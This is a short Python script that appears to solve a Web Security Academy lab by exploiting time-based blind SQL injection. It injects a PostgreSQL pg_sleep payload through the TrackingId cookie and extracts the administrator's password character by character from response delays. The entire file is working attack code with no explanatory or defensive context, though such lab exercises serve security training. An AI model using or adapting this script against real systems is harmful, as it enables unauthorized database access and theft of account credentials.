import requests
import string
import time 
import sys

chars = string.printable[:-6]
url='https://ac2a1f2f1e077f22c0b23870000b00a8.web-security-academy.net/'
pass_admin=''
i=1
s=requests.Session()
s.get(url)
#PostgreSQL	

while True:
	for c in chars:
		payload=f"1' || (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users where username='administrator' and substring(password,{i},1)='{c}')-- - "
		cookie1={"TrackingId":payload}
		time_1=time.time()
		r = requests.get(url,cookies=cookie1)
		print(c)
		time_2=time.time()
		sum_time=time_2 - time_1
		if sum_time < 3 :
			pass
		else :
			print('okeeeeeeeeeee')
			pass_admin+=c 
			i+=1
			print(pass_admin)
			break

		if(i==21):
			print('password administrator :' + pass_admin)
			exit()

